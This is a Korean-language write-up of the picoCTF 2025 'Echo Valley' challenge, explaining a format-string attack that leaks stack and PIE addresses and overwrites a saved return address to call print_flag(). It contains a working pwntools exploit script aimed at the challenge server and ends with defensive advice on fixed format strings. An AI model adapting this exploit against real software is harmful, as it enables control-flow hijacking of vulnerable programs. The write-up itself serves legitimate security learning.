---
title: Echo Valley — picoCTF 2025 pwn writeup
created: 2026-06-15
updated: 2026-06-15
type: query
tags: [ctf, pwn, format-string, pie, aslr, stack-leak, fmtstr, picoctf]
sources: [https://systemweakness.com/down-the-rabbit-hole-of-format-string-vulnerability-echo-valley-picoctf-2025-189f1cefed5f, https://habichuela.pages.dev/posts/picoctf-2025-pwn/, https://www.ztz0.com/writeups/2025/picoctf/pwn/echo-valley/]
confidence: high
---

# Echo Valley — picoCTF 2025 pwn writeup

> `Echo Valley`는 **`printf(buf)` 형식 문자열 취약점을 이용해 스택/코드 주소를 누출하고, PIE/ASLR을 역산해 `print_flag()`로 제어 흐름을 넘기는 picoCTF 2025 pwn 문제**입니다. 핵심은 **format string leak + runtime address calculation + saved return address overwrite**입니다.

## 1. 핵심 요약

- 바이너리는 **64-bit amd64**입니다.
- `printf(buf)`가 있어 **format string vulnerability**가 존재합니다.
- 반복 루프 안에서 입력을 받으므로 여러 번 leak/write를 시도할 수 있습니다.
- 보호 기법은 **Full RELRO, canary, NX, PIE, SHSTK, IBT**로 상당히 강합니다.
- 그럼에도 스택에 있는 **saved return address 슬롯**과 코드 포인터를 읽고/쓰면 해결할 수 있습니다.

## 2. 문제 구조

| 항목 | 내용 |
|------|------|
| 플랫폼 | picoCTF 2025 |
| 분류 | pwn / format string / PIE ASLR |
| 아키텍처 | 64-bit amd64 |
| 핵심 요소 | stack leak, return address overwrite |
| 보호 기법 | canary, NX, PIE, SHSTK, IBT |
| 목표 | `print_flag()` 호출 |

## 3. 공격 흐름

1. `%p` 계열로 스택 값을 여러 개 누출합니다.
2. 누출된 값 중 하나로 **리턴 주소**와 **PIE 베이스**를 계산합니다.
3. `print_flag()`의 runtime 주소를 구합니다.
4. `fmtstr_payload()` 또는 동등한 `%n` write를 사용해 **saved return address 슬롯**을 덮습니다.
5. 함수가 리턴할 때 `print_flag()`로 흐름이 이동합니다.

## 4. 왜 가능한가

이 문제는 단순히 값을 읽는 format string이 아니라, **읽기(leak)와 쓰기(write)를 함께 활용**해야 합니다. `printf(buf)`는 스택을 읽을 수 있게 하고, `%n` 계열은 메모리 쓰기까지 가능하게 합니다. PIE가 켜져 있어도, 한 번 주소를 새면 `print_flag()`와의 상대 오프셋으로 목적지 주소를 계산할 수 있습니다.

## 5. 대표적인 leak 포인트

공개 writeup들에서 공통적으로 다음 전략을 사용합니다.

- `%20$p`와 `%21$p` 근처에서 **리턴 주소 주변 값**을 확인합니다.
- `%31$p` 같은 위치에서 `main()` 주소를 얻습니다.
- 사용자 입력의 위치를 파악하기 위해 `%p`를 길게 나열합니다.

예시적으로, 스택에서 돌아가는 주소와 PIE 기준 주소를 함께 확인한 뒤:

```text
return address -> binary base -> print_flag()
```

순서로 역산합니다.

## 재현 절차
1. `printf(buf)`로 leak과 write 가능 여부를 확인합니다.
2. `%p` 계열로 스택과 코드 주소를 누출합니다.
3. 누출된 값으로 `print_flag()` 런타임 주소를 계산합니다.
4. 저장된 리턴 주소를 덮어 흐름을 넘깁니다.

```bash
# format string leak이 되는지 확인합니다.
printf '%%p %%p %%p %%p\n' | ./echo-valley

# 반복 루프와 스택 상태를 디버그합니다.
gdb -q ./echo-valley
```

## 6. 익스플로잇 예시

```python
from pwn import *  # pwntools를 불러옵니다.

elf = context.binary = ELF('./valley')  # 바이너리를 로드합니다.

# 로컬과 원격 실행을 전환하는 헬퍼입니다.
def start():
    if args.REMOTE:
        return remote('shape-facility.picoctf.net', 65385)  # 원격 서비스 예시입니다.
    return process(elf.path)  # 로컬 실행입니다.

io = start()

# 1) 리턴 주소와 PIE 관련 포인터를 누출합니다.
io.sendline(b'%20$p|%21$p|%31$p')
io.recvuntil(b'You heard in the distance: ')
leaks = io.recvline().strip().split(b'|')

stack_slot_ptr = int(leaks[0], 16) - 8  # saved return address 슬롯의 실제 위치를 계산합니다.
ret_addr = int(leaks[1], 16)           # 현재 리턴 주소 값입니다.
main_addr = int(leaks[2], 16)          # PIE 기준이 되는 코드 주소입니다.

# 2) print_flag()의 runtime 주소를 계산합니다.
base = main_addr - elf.symbols['main']
flag_addr = base + elf.symbols['print_flag']

print(f'base = {hex(base)}')
print(f'print_flag = {hex(flag_addr)}')

# 3) saved return address 슬롯을 print_flag()로 덮습니다.
payload = fmtstr_payload(
    offset=6,                 # 스택 상 input 위치에 맞춘 예시 값입니다.
    writes={stack_slot_ptr: flag_addr},
    write_size='short'
)

io.sendline(payload)  # format string write를 수행합니다.
io.interactive()      # flag 출력 후 확인합니다.
```

## 7. 방어 관점 메모

- `printf(user_input)`는 즉시 제거해야 합니다.
- `printf("%s", user_input)`처럼 **고정 포맷 문자열**을 사용해야 합니다.
- format string은 단순 정보 유출뿐 아니라 **임의 쓰기까지 이어질 수 있음**에 주의해야 합니다.
- PIE, canary, NX만으로는 format string을 완전히 막지 못합니다. 입력 검증이 필요합니다.

## 8. 비교 포인트

- `Flag Leak`은 **순수 정보 유출형** format string입니다.
- `Echo Valley`는 **정보 유출 + saved return address overwrite**까지 하는 format string입니다.
- `PIE TIME`은 **PIE/ASLR 주소 계산형**입니다.
- `Echo Valley`는 **format string leak + PIE 계산형**입니다.

## 9. 참고 자료

- [Echo Valley — picoCTF 2025 - System Weakness](https://systemweakness.com/down-the-rabbit-hole-of-format-string-vulnerability-echo-valley-picoctf-2025-189f1cefed5f)
- [picoCTF 2025 - echo-valley and handoff | habichuela.dev](https://habichuela.pages.dev/posts/picoctf-2025-pwn/)
- [Echo Valley - picoCTF 2025 Writeup - ztz0](https://www.ztz0.com/writeups/2025/picoctf/pwn/echo-valley/)
- [[format-string-ctf-patterns]]
- [[pie-aslr-function-offset-ctf-patterns]]
